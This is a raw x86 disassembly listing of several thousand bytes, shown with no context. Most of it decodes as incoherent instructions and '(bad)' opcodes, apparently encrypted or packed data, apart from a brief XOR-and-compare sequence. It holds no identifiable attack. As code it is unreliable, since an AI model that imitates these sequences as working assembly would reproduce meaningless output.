  408aa2:	sbb    ebp,DWORD PTR [ecx+edx*8]
  408aa5:	push   0x6b8dabfa
  408aaa:	pop    edi
  408aab:	xchg   ecx,eax
  408aac:	jp     0x408a8b
  408aae:	daa    
  408aaf:	jmp    0xa8471af4
  408ab4:	mul    DWORD PTR [ecx]
  408ab6:	mov    ds:0x681399fa,al
  408abb:	add    eax,0x982aff
  408ac0:	in     eax,dx
  408ac1:	loop   0x408a8c
  408ac3:	xchg   ecx,eax
  408ac4:	aam    0xcf
  408ac6:	inc    esi
  408ac7:	mov    eax,ds:0x3cc77e45
  408acc:	sahf   
  408acd:	test   DWORD PTR fs:[edx-0x66],edi
  408ad1:	adc    al,0x48
  408ad3:	aam    0x27
  408ad5:	int    0x7a
  408ad7:	stc    
  408ad8:	mov    al,ds:0xe6f0d15d
  408add:	call   0x79b04831
  408ae2:	xchg   DWORD PTR [ecx-0x21],ecx
  408ae5:	cdq    
  408ae6:	adc    eax,0xbd7d7696
  408aeb:	mov    bh,0x52
  408aed:	cmp    DWORD PTR [ebx+edx*2],eax
  408af0:	adc    BYTE PTR [ecx-0x6c],dh
  408af3:	jl     0x408b1a
  408af5:	mov    bl,0x3
  408af7:	into   
  408af8:	in     eax,dx
  408af9:	and    DWORD PTR [ebx],ebx
  408afb:	push   ss
  408afc:	sti    
  408afd:	pop    ebp
  408afe:	mov    esp,0xb178ebad
  408b03:	xor    al,0x6e
  408b05:	cmc    
  408b06:	ins    DWORD PTR es:[edi],dx
  408b07:	jno    0x408b86
  408b09:	jg     0x408b15
  408b0b:	arpl   WORD PTR [ebx+0x42],bp
  408b0e:	cmp    bl,BYTE PTR [ebx+0x45f90483]
  408b14:	push   ss
  408b15:	xor    al,0xe2
  408b17:	inc    ecx
  408b18:	jbe    0x408b92
  408b1a:	repz mov ebx,0xc38a73d7
  408b20:	mov    esi,0xcb82f289
  408b25:	push   ebp
  408b26:	sub    eax,esi
  408b28:	adc    al,dl
  408b2a:	repz or al,0xeb
  408b2d:	jbe    0x408b97
  408b2f:	arpl   WORD PTR [edx],sp
  408b31:	pop    ds
  408b32:	dec    bp
  408b34:	retf   
  408b35:	mov    bh,cl
  408b37:	frstor [edx-0x64]
  408b3a:	mov    BYTE PTR [ebx],dl
  408b3c:	rcl    BYTE PTR [eax+0x17],1
  408b3f:	sbb    eax,0x5804c1f2
  408b44:	les    ebp,FWORD PTR [edx]
  408b46:	gs iret 
  408b48:	div    BYTE PTR [edx-0x751811f2]
  408b4e:	stos   DWORD PTR es:[edi],eax
  408b4f:	push   ebx
  408b50:	and    al,0x3e
  408b52:	loop   0x408ba3
  408b54:	fwait
  408b55:	jp     0x408b17
  408b57:	arpl   WORD PTR [ecx+0x48d79630],cx
  408b5d:	adc    eax,0xc994ba10
  408b62:	dec    edx
  408b63:	jae    0x408af1
  408b65:	xchg   esi,eax
  408b66:	inc    edi
  408b67:	pop    es
  408b68:	sub    ebp,ecx
  408b6a:	sub    eax,DWORD PTR [ebx+0x4b8d05ae]
  408b70:	lds    ebp,FWORD PTR [ebx-0x203566b5]
  408b76:	xchg   edx,eax
  408b77:	pop    eax
  408b78:	jno    0x408b9b
  408b7a:	push   ds
  408b7b:	outs   dx,DWORD PTR ds:[esi]
  408b7c:	mov    al,ds:0x94ce2806
  408b81:	retf   0x5b2b
  408b84:	test   BYTE PTR [edi+0x2a5ebfbe],bh
  408b8a:	push   esp
  408b8b:	jmp    FWORD PTR [eax-0x75]
  408b8e:	dec    edx
  408b8f:	popf   
  408b90:	mov    ch,0x84
  408b92:	xchg   edx,eax
  408b93:	fst    QWORD PTR [edx]
  408b95:	icebp  
  408b96:	stc    
  408b97:	neg    BYTE PTR [edx+0x54]
  408b9a:	imul   ecx,DWORD PTR [ebx-0x2f],0x26
  408b9e:	aaa    
  408b9f:	inc    DWORD PTR [ebx+0x1e]
  408ba2:	fwait
  408ba3:	inc    esp
  408ba4:	out    0xc6,al
  408ba6:	rcr    DWORD PTR [ebx-0x59306034],1
  408bac:	les    esp,FWORD PTR [edi+0xb6071e1]
  408bb2:	sub    eax,0x59e89121
  408bb7:	lea    ecx,[edi+0x39602b81]
  408bbd:	or     dl,BYTE PTR [edi+0xd]
  408bc0:	mov    esp,esi
  408bc2:	in     eax,0x6b
  408bc4:	add    BYTE PTR [ecx],0xc3
  408bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bc8:	jmp    0xeb2:0xb8e75dcb
  408bcf:	ror    BYTE PTR [esi-0x1fb200ab],1
  408bd5:	repnz int 0x1
  408bd8:	fwait
  408bd9:	mov    bl,0x33
  408bdb:	mov    ds:0x2686e38d,al
  408be0:	pushf  
  408be1:	cmp    eax,0xd86aefa3
  408be6:	xor    eax,0x3fbf7300
  408beb:	dec    esi
  408bec:	dec    esi
  408bed:	hlt    
  408bee:	ret    
  408bef:	in     al,0x81
  408bf1:	push   edi
  408bf2:	jnp    0x408c5d
  408bf4:	dec    eax
  408bf5:	jmp    0x408c04
  408bf7:	mov    ss,esi
  408bf9:	mov    ebx,0x5034f4d3
  408bfe:	mov    dh,0x1
  408c00:	sub    bl,bl
  408c02:	mov    BYTE PTR [esi*2+0xc862def],bl
  408c09:	popf   
  408c0a:	mov    cs,WORD PTR [ebx]
  408c0c:	(bad)  
  408c0d:	lea    eax,[eax+ecx*1+0x3272f5]
  408c14:	mov    DWORD PTR [ebp+0x8],eax
  408c17:	mov    eax,DWORD PTR [ebp-0xc]
  408c1a:	mov    ecx,DWORD PTR [ebp+0x14]
  408c1d:	xor    eax,esi
  408c1f:	add    eax,edi
  408c21:	imul   eax,DWORD PTR [ecx]
  408c24:	mov    ecx,DWORD PTR [ebp-0x4]
  408c27:	mov    edx,DWORD PTR [ebp+0x8]
  408c2a:	xor    ecx,esi
  408c2c:	lea    ecx,[ecx+edx*1+0x3272f5]
  408c33:	cmp    ecx,eax
  408c35:	jne    0x406849
  408c3b:	jmp    0x40afcd
  408c40:	or     eax,0xbf3c7fd1
  408c45:	mov    cl,BYTE PTR [edx]
  408c47:	into   
  408c48:	and    bl,BYTE PTR [ebx]
  408c4a:	and    eax,0xc5dd772a
  408c4f:	inc    esp
  408c50:	pushf  
  408c51:	sbb    BYTE PTR [ebx-0x7ca1f37d],al
  408c57:	sub    DWORD PTR [eax],0xffffffc3
  408c5a:	(bad)  
  408c5b:	and    ecx,DWORD PTR [edx]
  408c5d:	jmp    0xfe552303
  408c62:	sbb    eax,0x17334447
  408c67:	mov    DWORD PTR ds:[eax],edi
  408c6a:	arpl   WORD PTR [esi+ebp*2],ax
  408c6d:	ss adc al,0xe1
  408c70:	test   BYTE PTR [ecx],0xd9
  408c73:	push   cs
  408c74:	xchg   esp,eax
  408c75:	cmp    cl,BYTE PTR [edi]
  408c77:	jno    0x408c0b
  408c79:	mov    esp,0x39880e77
  408c7e:	pop    esp
  408c7f:	or     esi,DWORD PTR [ebx]
  408c81:	clc    
  408c82:	xor    bl,BYTE PTR [esi-0x26]
  408c85:	pop    ebp
  408c86:	mov    eax,ds:0xc3eafe15
  408c8b:	sbb    BYTE PTR [eax],dh
  408c8d:	jno    0x408ce5
  408c8f:	push   edx
  408c90:	push   eax
  408c91:	pop    esi
  408c92:	fst    QWORD PTR [ecx+0x5ce887f5]
  408c98:	aaa    
  408c99:	adc    ecx,DWORD PTR [ebp-0x386627dc]
  408c9f:	arpl   WORD PTR ds:0xb1bdc5b7,bx
  408ca5:	leave  
  408ca6:	jg     0x408ce6
  408ca8:	or     al,0xc2
  408caa:	scas   al,BYTE PTR es:[edi]
  408cab:	jl     0x408cd0
  408cad:	test   al,0x88
  408caf:	push   edx
  408cb0:	popa   
  408cb1:	loopne 0x408d2a
  408cb3:	pop    ecx
  408cb4:	(bad)  
  408cb5:	adc    BYTE PTR [edi],dh
  408cb7:	push   ds
  408cb8:	enter  0x9ecc,0x17
  408cbc:	xchg   esi,eax
  408cbd:	je     0x408c41
  408cbf:	xor    BYTE PTR [edx-0x2b],dl
  408cc2:	shl    esp,cl
  408cc4:	xor    al,0xf3
  408cc6:	add    BYTE PTR [esi-0x6e],cl
  408cc9:	jnp    0x408cf0
  408ccb:	scas   eax,DWORD PTR es:[edi]
  408ccc:	mov    cl,0xe8
  408cce:	mov    ecx,0xdb10b374
  408cd3:	adc    eax,0x6e2d2d3a
  408cd8:	xor    DWORD PTR [esi],0xa048b5a
  408cde:	pop    ss
  408cdf:	dec    edx
  408ce0:	fild   WORD PTR [eax]
  408ce2:	push   0xd
  408ce4:	or     bh,cl
  408ce6:	out    dx,eax
  408ce7:	inc    edi
  408ce8:	sbb    al,0x29
  408cea:	fdivr  DWORD PTR [edi+eiz*8+0x2b24431f]
  408cf1:	cmp    BYTE PTR [esi-0x23e0b3d1],bh
  408cf7:	jae    0x408c87
  408cf9:	mov    dl,0x4b
  408cfb:	(bad)  
  408cfc:	fcmovnu st,st(1)
  408cfe:	jmp    0xff6a4b65
  408d03:	and    al,0x73
  408d05:	dec    esp
  408d06:	int    0x8c
  408d08:	jnp    0x408cd6
  408d0a:	cmc    
  408d0b:	icebp  
  408d0c:	(bad)  
  408d0e:	fld    DWORD PTR [edi+eax*8]
  408d11:	mov    ebp,DWORD PTR [ebx-0x5d]
  408d14:	int    0xfb
  408d16:	out    dx,eax
  408d17:	pop    edi
  408d18:	int3   
  408d19:	lock imul ebp,DWORD PTR [ecx+eiz*8-0x764eb566],0x26
  408d22:	inc    ebp
  408d23:	dec    eax
  408d24:	enter  0xd37c,0xa0
  408d28:	fcmovnu st,st(4)
  408d2a:	xchg   esp,eax
  408d2b:	fcmove st,st(3)
  408d2d:	mov    bh,0xe5
  408d2f:	comiss xmm0,DWORD PTR [edx+0x4c]
  408d33:	out    0x5d,al
  408d35:	call   0x98ed130b
  408d3a:	mov    esi,0x1941516d
  408d3f:	push   esi
  408d40:	mov    ah,0x98
  408d42:	push   esi
  408d43:	ffree  st(1)
  408d45:	cwde   
  408d46:	out    0xa3,al
  408d48:	and    DWORD PTR ds:0xf562d497,0x5a
  408d4f:	inc    edx
  408d50:	(bad)  
  408d51:	popa   
  408d52:	rol    ecx,0x3f
  408d55:	sub    DWORD PTR [ebp-0x572ba9a1],esp
  408d5b:	rcl    dh,cl
  408d5d:	out    dx,eax
  408d5e:	pop    ss
  408d5f:	lea    edx,[edi-0x27]
  408d62:	jle    0x408d53
  408d64:	imul   ebx,DWORD PTR [esi],0xffffffd6
  408d67:	es pop ebx
  408d69:	fs sbb cl,dh
  408d6c:	outs   dx,DWORD PTR ds:[esi]
  408d6d:	nop
  408d6e:	xor    bl,BYTE PTR [edx]
  408d70:	sahf   
  408d71:	stos   DWORD PTR es:[edi],eax
  408d72:	jge    0x408d61
  408d74:	test   DWORD PTR [ebp-0x7d695655],esp
  408d7a:	cmp    BYTE PTR [eax+0x2c3668c7],cl
  408d80:	jg     0x408d29
  408d82:	in     eax,0x8c
  408d84:	pand   mm6,QWORD PTR [ecx+0x22]
  408d88:	pop    edx
  408d89:	int3   
  408d8a:	int3   
  408d8b:	(bad)  
  408d8c:	sub    al,0x6f
  408d8e:	adc    al,0x58
  408d90:	fcmove st,st(4)
  408d92:	xchg   edi,eax
  408d93:	(bad)  
  408d94:	cs mov eax,0x63e4d62c
  408d9a:	pop    esi
  408d9b:	out    0xcb,eax
  408d9d:	jge    0x408d68
  408d9f:	mov    esp,0xf49f9c0c
  408da4:	enter  0xc02e,0xc4
  408da8:	lods   al,BYTE PTR ds:[esi]
  408da9:	icebp  
  408daa:	arpl   WORD PTR [eax],ax
  408dac:	dec    esi
  408dad:	jmp    0x408dcc
  408daf:	sub    BYTE PTR [ecx],al
  408db1:	in     al,dx
  408db2:	push   eax
  408db3:	mov    eax,0x10e70750
  408db8:	ret    0xe6ac
  408dbb:	add    DWORD PTR [ecx-0x23],ecx
  408dbe:	mov    dh,0x94
  408dc0:	sub    DWORD PTR [esi+0x5eaa0916],eax
  408dc6:	and    al,0x90
  408dc8:	and    esi,DWORD PTR [eax]
  408dca:	inc    ecx
  408dcb:	mov    eax,ds:0x2749f970
  408dd0:	mov    dl,0xde
  408dd2:	add    BYTE PTR [esi+eiz*1-0x69],ch
  408dd6:	in     al,0xae
  408dd8:	mov    dl,0x2
  408dda:	push   es
  408ddb:	js     0x408d6c
  408ddd:	mov    WORD PTR [eax],?
  408ddf:	xchg   esi,eax
  408de0:	dec    ecx
  408de1:	popa   
  408de2:	sub    eax,0xe346ec63
  408de7:	xor    DWORD PTR [eax+ebp*4+0x1b4d71dc],esp
  408dee:	inc    edx
  408def:	lea    ebx,[ecx]
  408df1:	jns    0x408de5
  408df3:	sub    bl,al
  408df5:	xor    al,0x7a
  408df7:	(bad)  
  408df8:	(bad)  
  408df9:	mov    edx,0xc0791c72
  408dfe:	jecxz  0x408e42
  408e00:	mov    bl,0x86
  408e02:	mov    dl,0xab
  408e04:	(bad)
  408e07:	xor    eax,0x13fbb949
  408e0c:	adc    eax,0x90b181e1
  408e11:	fisubr DWORD PTR [esi]
  408e13:	jl     0x408dfe
  408e15:	xor    esp,DWORD PTR [eax-0x2a]
  408e18:	mov    ds:0xaa4eef45,eax
  408e1d:	iret   
  408e1e:	mov    ebx,DWORD PTR [eax-0x3da67d1]
  408e24:	je     0x408dc0
  408e26:	test   DWORD PTR [ecx+0x4b00102f],edx
  408e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2d:	push   0x6236b00f
  408e32:	aaa    
  408e33:	(bad)  
  408e34:	mov    edx,0x1aef81e4
  408e39:	inc    edx
  408e3a:	ds int 0x33
  408e3d:	cmp    esi,0x53badfef
  408e43:	nop
  408e44:	into   
  408e45:	pop    es
  408e46:	inc    edx
  408e47:	in     eax,0x44
  408e49:	adc    bh,BYTE PTR [eax-0x1e]
  408e4c:	xchg   edx,eax
  408e4d:	mov    ch,0xde
  408e4f:	jo     0x408e49
  408e51:	ret    
  408e52:	into   
  408e53:	inc    esi
  408e54:	add    al,0x88
  408e56:	popa   
  408e57:	pop    eax
  408e58:	test   eax,0x51d0a522
  408e5d:	es push eax
  408e5f:	dec    ebx
  408e60:	repz (bad) 
  408e62:	iret   
  408e63:	neg    DWORD PTR [ebp-0x5d63758c]
  408e69:	daa    
  408e6a:	js     0x408e14
  408e6c:	jg     0x408ee0
  408e6e:	jb     0x408ea4
  408e70:	or     esi,esp
  408e72:	in     al,dx
  408e73:	inc    ecx
  408e74:	lea    esi,[eax+0x7e]
  408e77:	cmp    edx,ecx
  408e79:	lea    esi,[ebx-0x3d]
  408e7c:	jl     0x408e58
  408e7e:	xchg   ebp,eax
  408e7f:	sbb    al,0xeb
  408e81:	inc    ecx
  408e82:	lods   eax,DWORD PTR ds:[esi]
  408e83:	or     DWORD PTR ds:0x84276842,eax
  408e89:	adc    eax,esp
  408e8b:	out    dx,al
  408e8c:	and    ecx,DWORD PTR [eax-0x6e]
  408e8f:	mov    eax,0x604ece8f
  408e94:	(bad)  
  408e95:	popf   
  408e96:	mov    eax,ds:0xbb11c36b
  408e9b:	stc    
  408e9c:	int3   
  408e9d:	retf   
  408e9e:	clc    
  408e9f:	scas   eax,DWORD PTR es:[edi]
  408ea0:	dec    DWORD PTR [edi-0x3553e60c]
  408ea6:	and    eax,0x13f40d16
  408eab:	xor    ebp,esp
  408ead:	(bad)  
  408eae:	stos   BYTE PTR es:[edi],al
  408eaf:	mov    esi,DWORD PTR [eax-0x2d5609]
  408eb5:	mov    bh,BYTE PTR [eax+0x54]
  408eb8:	ds xor bl,cl
  408ebb:	pop    ecx
  408ebc:	shl    ebp,0x31
  408ebf:	mov    ah,BYTE PTR [ecx+ecx*2]
  408ec2:	xchg   esi,eax
  408ec3:	dec    esp
  408ec4:	cs sbb al,0x60
  408ec7:	and    al,0x4a
  408ec9:	mov    edx,0x84eb337a
  408ece:	or     eax,0x55ee02db
  408ed3:	(bad)  
  408ed5:	cmp    DWORD PTR [esp+edi*8-0x2413f9dd],edx
  408edc:	mov    eax,0x4e8087a0
  408ee1:	out    dx,al
  408ee2:	lock ftst 
  408ee5:	pushf  
  408ee6:	dec    edi
  408ee7:	inc    esi
  408ee8:	loopne 0x408f5c
  408eea:	pop    eax
  408eeb:	or     esi,ecx
  408eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eee:	mov    al,0xd6
  408ef0:	mov    al,ds:0x17e214fc
  408ef5:	cwde   
  408ef6:	push   edi
  408ef7:	xor    edx,DWORD PTR [ecx+0x41]
  408efa:	in     eax,dx
  408efb:	push   es
  408efc:	push   ds
  408efd:	cld    
  408efe:	add    BYTE PTR [eax],al
  408f00:	adc    al,0x5a
  408f02:	dec    esi
  408f03:	sub    al,0x31
  408f05:	mov    ch,0x80
  408f07:	push   edi
  408f08:	test   DWORD PTR [edi-0x1dd22be7],eax
  408f0e:	sbb    ch,BYTE PTR [eax-0x6c186871]
  408f14:	iret   
  408f15:	mov    ch,bh
  408f17:	sub    ah,BYTE PTR ss:[ebx-0x4ea9eadf]
  408f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1f:	push   ss
  408f20:	pop    ebp
  408f21:	into   
  408f22:	in     eax,dx
  408f23:	cmp    dh,BYTE PTR [ebp-0x7b]
  408f26:	ret    0xd0c5
  408f29:	cdq    
  408f2a:	adc    al,0xdf
  408f2c:	not    DWORD PTR [eax+0x4b]
  408f2f:	sbb    edi,DWORD PTR [esi+0x321a7baa]
  408f35:	call   0x9f08:0xb8e3752f
  408f3c:	mov    ah,0xcd
  408f3e:	xchg   DWORD PTR [eax+ebx*2+0x655f63d6],edx
  408f45:	add    al,0x7d
  408f47:	mov    ds,ebp
  408f49:	add    eax,0x80c4bfda
  408f4e:	sbb    edi,DWORD PTR [eax-0x74]
  408f51:	push   cs
  408f52:	inc    edx
  408f53:	mov    dl,0x4c
  408f55:	test   BYTE PTR [esi],bl
  408f57:	pop    edx
  408f58:	(bad)
  408f5c:	rol    DWORD PTR [edi],cl
  408f5e:	sbb    edi,edi
  408f60:	fnstcw WORD PTR [eax+0x63]
  408f63:	je     0x408fc5
  408f65:	mov    ds:0xac9189da,eax
  408f6a:	xor    al,cl
  408f6c:	dec    edi
  408f6d:	and    DWORD PTR [edx-0x5b9ee575],edx
  408f73:	or     al,0x47
  408f75:	jmp    0x71eef348
  408f7a:	mov    dl,0x18
  408f7c:	mov    esi,edx
  408f7e:	or     eax,0x537c4e48
  408f83:	cmp    ecx,DWORD PTR [edi-0x2e]
  408f86:	clc    
  408f87:	loope  0x408f24
  408f89:	test   ah,cl
  408f8b:	sbb    DWORD PTR [ebp-0x337c55a4],ebp
  408f91:	mov    esp,0x68a5c41
  408f96:	je     0x408fb9
  408f98:	mov    bl,0xf0
  408f9a:	(bad)  
  408f9b:	sub    BYTE PTR [ecx-0x332156b9],ch
  408fa1:	mov    bh,0x52
  408fa3:	mov    edx,0xd26a74d
  408fa8:	ret    
  408fa9:	clc    
  408faa:	or     esi,DWORD PTR [edi+0x3e]
  408fad:	daa    
  408fae:	adc    DWORD PTR [edi+0x4e],edx
  408fb1:	jno    0x408f75
  408fb3:	push   ebx
  408fb4:	xchg   ecx,eax
  408fb5:	xchg   esi,eax
  408fb6:	icebp  
  408fb7:	into   
  408fb8:	ins    DWORD PTR es:[edi],dx
  408fb9:	mov    edi,0x9aed9c00
  408fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fbf:	add    eax,DWORD PTR [eax+0x6d23ba06]
  408fc5:	(bad)  
  408fc6:	adc    BYTE PTR [ecx],cl
  408fc8:	(bad)  
  408fc9:	shl    DWORD PTR [ebx+eax*1-0x1b00ad30],cl
  408fd0:	jg     0x408fd8
  408fd2:	ins    DWORD PTR es:[edi],dx
  408fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fd4:	fisub  WORD PTR [edx+0x65a660e9]
  408fda:	shl    edx,cl
  408fdc:	and    bl,dl
  408fde:	jno    0x408fa4
  408fe0:	jno    0x408fa8
  408fe2:	pusha  
  408fe3:	in     al,0x0
  408fe5:	dec    edx
  408fe6:	aam    0xdf
  408fe8:	jno    0x40902a
  408fea:	pusha  
  408feb:	mov    ebp,0xa68a29b1
  408ff0:	mov    ecx,DWORD PTR [ebp-0x52]
  408ff3:	fdiv   QWORD PTR [ecx]
  408ff5:	or     eax,0xd9322c8b
  408ffa:	ficomp DWORD PTR [edx*2-0x7c6ffa16]
  409001:	push   es
  409002:	in     al,0x21
  409004:	pop    es
  409005:	(bad)  
  409006:	mov    ds:0x96782136,al
  40900b:	pop    ss
  40900c:	mov    ah,0x3f
  40900e:	ret    0x3666
  409011:	mov    ebx,esp
  409013:	sub    ecx,eax
  409015:	cmp    eax,0x2c946a85
  40901a:	aaa    
  40901b:	es jnp 0x409099
  40901e:	jnp    0x409002
  409020:	call   0xef7f:0xf56469a4
  409027:	je     0x409055
  409029:	je     0x40905d
  40902b:	adc    eax,0x1c030633
  409030:	ret    0x469c
  409033:	(bad)  
  409034:	shl    BYTE PTR [esi+0x57c15a18],cl
  40903a:	mov    ebx,0x90cad499
  40903f:	push   ebx
  409040:	inc    edx
  409041:	jle    0x408fe8
  409043:	inc    eax
  409044:	sbb    cl,BYTE PTR ds:0x504a1cb7
  40904a:	das    
  40904b:	aaa    
  40904c:	inc    edi
  40904d:	arpl   WORD PTR [edx],cx
  40904f:	jmp    0x2af109b6
  409054:	dec    ecx
  409055:	inc    edi
  409056:	xchg   edi,eax
  409057:	adc    DWORD PTR [eax+0x1d8db944],0xffffff90
  40905e:	pushf  
  40905f:	xor    BYTE PTR [eax],bl
  409061:	sbb    bl,BYTE PTR [edi]
  409063:	inc    esp
  409064:	pop    eax
  409065:	sub    al,dh
  409067:	xchg   esi,eax
  409068:	nop
  409069:	std    
  40906a:	push   ds
  40906b:	push   ebx
  40906c:	pop    edx
  40906d:	ret    
  40906e:	mov    ebx,0x9522fd2e
  409073:	popa   
  409074:	div    BYTE PTR [edi-0x4c1fd74]
  40907a:	lods   al,BYTE PTR ds:[esi]
  40907b:	lea    ebp,[esi]
  40907d:	mov    ecx,0x6943ee8e
  409082:	xchg   ebp,eax
  409083:	sbb    eax,0xf99193dd
  409088:	test   BYTE PTR [edx-0x54e020ff],al
  40908e:	lods   al,BYTE PTR ds:[esi]
  40908f:	outs   dx,BYTE PTR ds:[esi]
  409090:	fwait
  409091:	dec    ebp
  409092:	scas   eax,DWORD PTR es:[edi]
  409093:	sub    al,0x91
  409095:	stos   DWORD PTR es:[edi],eax
  409096:	sub    edi,DWORD PTR [eax-0x7b]
  409099:	pop    esi
  40909a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40909b:	retf   
  40909c:	dec    edx
  40909d:	sub    esp,DWORD PTR [eax]
  40909f:	ja     0x4090e2
  4090a1:	mov    al,bh
  4090a3:	call   0x175:0x858bb261
  4090aa:	mov    ebx,0x3178fcbc
  4090af:	sbb    al,BYTE PTR [ebp+0x0]
  4090b2:	sbb    eax,0x686a93d2
  4090b7:	lock fs jmp 0x409060
  4090bb:	adc    al,0x4b
  4090bd:	in     al,0x6
  4090bf:	inc    esp
  4090c0:	mov    ch,0xf1
  4090c2:	adc    al,0x70
  4090c4:	add    BYTE PTR [esi-0x63],al
  4090c7:	test   BYTE PTR [esi+eiz*1],cl
  4090ca:	pusha  
  4090cb:	dec    esi
  4090cc:	iret   
  4090cd:	mov    cl,0x3f
  4090cf:	dec    ebx
  4090d0:	outs   dx,DWORD PTR ds:[esi]
  4090d1:	add    dl,BYTE PTR [ecx-0x5da1d52]
  4090d7:	jl     0x40912f
  4090d9:	clc    
  4090da:	xchg   esi,eax
  4090db:	mov    al,0x0
  4090dd:	daa    
  4090de:	adc    bl,BYTE PTR [esi]
  4090e0:	or     DWORD PTR [ebp-0x170a0e5e],ecx
  4090e6:	and    DWORD PTR [ebx+esi*2],ecx
  4090e9:	clc    
  4090ea:	sbb    dl,BYTE PTR [edi]
  4090ec:	sbb    DWORD PTR [edx-0x10],edx
  4090ef:	jnp    0x4090d4
  4090f1:	xor    BYTE PTR [edx+0x6c],ah
  4090f4:	jmp    0x409096
  4090f6:	je     0x409107
  4090f8:	pop    ebx
  4090f9:	stc    
  4090fa:	mov    ebx,0xaa8643f
  4090ff:	stos   DWORD PTR es:[edi],eax
  409100:	mov    edi,edi
  409102:	fs mov al,0xb
  409105:	inc    edx
  409106:	out    dx,eax
  409107:	adc    ah,BYTE PTR [ebx+0x45]
  40910a:	nop
  40910b:	or     BYTE PTR [ecx+0x49],bh
  40910e:	popa   
  40910f:	mov    WORD PTR [eax+ecx*4-0x6a],?
  409113:	pop    edx
  409114:	popa   
  409115:	daa    
  409116:	inc    ebx
  409117:	dec    edi
  409118:	add    dl,bl
  40911a:	fcom   DWORD PTR [ebx]
  40911c:	xchg   ecx,eax
  40911d:	pop    edx
  40911e:	xor    BYTE PTR [ebp-0x41b43231],ah
  409124:	mul    BYTE PTR [ebp+0xc89b274]
  40912a:	inc    edx
  40912b:	je     0x409190
  40912d:	mov    ebp,0xbc5b1ddc
  409132:	mov    eax,0xc907422c
  409137:	add    DWORD PTR [edi],edx
  409139:	ins    DWORD PTR es:[edi],dx
  40913a:	shl    BYTE PTR [edi],1
  40913c:	aas    
  40913d:	push   0x44b721e8
  409142:	or     dl,dh
  409144:	mov    ch,ch
  409146:	jae    0x40915d
  409148:	or     eax,0x96158bdd
  40914d:	jmp    0x527f:0x4312e267
  409154:	cmp    BYTE PTR [ecx+edi*8],dh
  409157:	sbb    DWORD PTR [ebx],esi
  409159:	add    al,BYTE PTR ds:0x95480f4d
  40915f:	(bad)  
  409160:	nop
  409161:	jmp    0xd5f51caa
  409166:	jmp    0xad9073fb
  40916b:	mov    bh,0xfd
  40916d:	rcl    BYTE PTR [eax+edx*4],0x75
  409171:	int3   
  409172:	test   eax,0xf47eeb3c
  409177:	mov    bl,0x99
  409179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40917a:	pop    esp
  40917b:	int    0x6a
  40917d:	popf   
  40917e:	pop    edi
  40917f:	sub    DWORD PTR [ecx-0x76a44f36],ebp
  409185:	sbb    dl,bl
  409187:	ds (bad) 
  409189:	mov    dl,0xe0
  40918b:	pop    esp
  40918c:	push   ebp
  40918d:	loopne 0x40917a
  40918f:	mov    DWORD PTR [esi-0x1e692974],edi
  409195:	push   edi
  409196:	inc    esi
  409197:	jg     0x409170
  409199:	xchg   ebx,eax
  40919a:	das    
  40919b:	mov    ebp,0x8761edce
  4091a0:	adc    eax,0x959eea35
  4091a5:	ss scas al,BYTE PTR es:[edi]
  4091a7:	not    ebx
  4091a9:	loopne 0x409178
  4091ab:	cmp    dh,BYTE PTR [edx-0x4c]
  4091ae:	scas   al,BYTE PTR es:[edi]
  4091af:	and    DWORD PTR [esi+eiz*4],ebx
  4091b2:	loope  0x4091c1
  4091b4:	jmp    0xefff9add
  4091b9:	dec    edi
  4091ba:	adc    eax,ebp
  4091bc:	push   ebx
  4091bd:	or     BYTE PTR [eax+0x6d],dh
  4091c0:	sahf   
  4091c1:	ins    BYTE PTR es:[edi],dx
  4091c2:	(bad)  
  4091c3:	hlt    
  4091c4:	push   ebx
  4091c5:	inc    ebp
  4091c6:	dec    esp
  4091c7:	mov    ds:0xacc909c,al
  4091cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091cd:	add    eax,0x789fd645
  4091d2:	addr16 repz or DWORD PTR [bx+si],esi
  4091d7:	mov    BYTE PTR ds:0x6ad31c44,ah
  4091dd:	leave  
  4091de:	xchg   ebx,eax
  4091df:	adc    al,0x56
  4091e1:	inc    esi
  4091e2:	(bad)  
  4091e3:	std    
  4091e4:	les    edi,FWORD PTR [edi-0x5ff2eb7a]
  4091ea:	mov    bh,0x92
  4091ec:	or     BYTE PTR [edi+0x1a7eb9b8],dl
  4091f2:	clc    
  4091f3:	xor    al,0xca
  4091f5:	lods   eax,DWORD PTR ds:[esi]
  4091f6:	sbb    edx,DWORD PTR [ebx]
  4091f8:	inc    ebx
  4091f9:	xlat   BYTE PTR ds:[ebx]
  4091fa:	push   esi
  4091fb:	retf   0x8f61
  4091fe:	mov    ebx,0xae7e9aef
  409203:	ds ins BYTE PTR es:[edi],dx
  409205:	add    edi,DWORD PTR [eax+0x6e17616c]
  40920b:	mov    ds:0xa90aa8c,eax
  409210:	xor    eax,0x1a046248
  409215:	sbb    dh,ch
  409217:	repz fwait
  409219:	inc    edx
  40921a:	icebp  
  40921b:	mov    cl,0x9a
  40921d:	mov    ch,cl
  40921f:	and    edi,DWORD PTR [edi-0x39]
  409222:	mov    eax,ds:0xa83817be
  409227:	cld    
  409228:	gs and eax,0x9216bffc
  40922e:	push   ecx
  40922f:	inc    ebx
  409230:	push   edi
  409231:	sbb    al,0xef
  409233:	jo     0x409204
  409235:	ins    BYTE PTR es:[edi],dx
  409236:	ds jns 0x409212
  409239:	mov    dl,0xc6
  40923b:	aaa    
  40923c:	pop    bx
  40923e:	(bad)  [edi-0x7c]
  409241:	or     edx,DWORD PTR [edx+ecx*2+0x21]
  409245:	js     0x4091d7
  409247:	xchg   ecx,eax
  409248:	stos   DWORD PTR es:[edi],eax
  409249:	popa   
  40924a:	not    DWORD PTR [edx-0x4c040f]
  409250:	and    eax,0x4ca45431
  409255:	imul   edi,DWORD PTR [ecx+0x42723e78],0xf1cf3bb6
  40925f:	mov    edi,0x7c803fa6
  409264:	call   0x98e8:0x8e7f8d4e
  40926b:	add    BYTE PTR [edi+0x6b],dl
  40926e:	aam    0x67
  409270:	dec    ebp
  409271:	xchg   edx,eax
  409272:	nop
  409273:	jns    0x409224
  409275:	mov    bl,0xe8
